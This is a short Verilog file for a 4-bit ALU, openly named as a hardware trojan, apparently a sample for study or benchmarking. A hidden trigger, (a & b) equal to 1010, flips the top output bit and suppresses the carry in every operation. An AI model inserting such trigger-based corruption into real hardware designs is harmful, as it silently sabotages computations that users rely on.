module alu_trojan (
    input [1:0] op, input [3:0] a, input [3:0] b, output reg [3:0] out, output reg cout
);
    wire [4:0] sum, diff;
    wire trigger;
    assign trigger = ((a & b) == 4'b1010) ? 1'b1 : 1'b0;
    assign sum = a + b;
    assign diff = a - b;

    always @(*) begin
        out = 4'b0000; cout = 1'b0;
        case (op)
            2'b00: begin    //Add
                out = trigger ? sum[3:0] ^ 4'b1000 : sum[3:0];
                cout = trigger ? 1'b0 : sum[4];
            end
            2'b01: begin    //Subtract
                out = trigger ? diff[3:0] ^ 4'b1000 : diff[3:0];
                cout = trigger ? 1'b0 : diff[4];
            end
            2'b10: begin    //And
                out = trigger ? (a & b) ^ 4'b1000 : (a & b);
            end
            2'b11: begin    //Or
                out = trigger ? (a | b) ^ 4'b1000 : (a | b);
            end
            default: begin
                out = 4'b0000;
                cout = 1'b0;
            end
        endcase
    end
endmodule